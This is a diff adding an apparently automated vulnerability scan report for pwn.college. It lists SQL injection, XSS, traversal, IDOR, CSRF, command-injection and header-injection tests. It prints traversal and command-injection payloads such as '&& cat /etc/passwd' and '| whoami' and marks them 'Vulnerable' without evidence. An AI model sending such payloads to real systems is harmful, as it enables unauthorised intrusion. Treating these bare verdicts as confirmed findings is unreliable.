@@ -1,0 +1,49 @@
+Vulnerability Assessment Report for https://pwn.college/
+================================================================================
+Report Generated on: 2024-10-30 13:10:27
+================================================================================
+
+Test: SQL Injection
+--------------------------------------------------------------------------------
+  - No vulnerabilities found.
+
+Test: XSS
+--------------------------------------------------------------------------------
+  - No vulnerabilities found.
+
+Test: Directory Traversal
+--------------------------------------------------------------------------------
+  - Payload: ../../../windows/system32/cmd.exe
+    Status: Vulnerable
+    Reason: Sensitive system content exposed in response.
+
+Test: IDOR
+--------------------------------------------------------------------------------
+  - Payload: Accessing /users/1/profile
+    Status: Secure
+    Reason: No unauthorized access detected.
+  - Payload: Accessing /users/2/profile
+    Status: Secure
+    Reason: No unauthorized access detected.
+
+Test: CSRF
+--------------------------------------------------------------------------------
+  - No vulnerabilities found.
+
+Test: Command Injection
+--------------------------------------------------------------------------------
+  - Payload: ; ls
+    Status: Vulnerable
+    Reason: Command execution detected in response.
+  - Payload: && cat /etc/passwd
+    Status: Vulnerable
+    Reason: Command execution detected in response.
+  - Payload: | whoami
+    Status: Vulnerable
+    Reason: Command execution detected in response.
+
+Test: HTTP Header Injection
+--------------------------------------------------------------------------------
+  - No vulnerabilities found.
+================================================================================
+End of Report
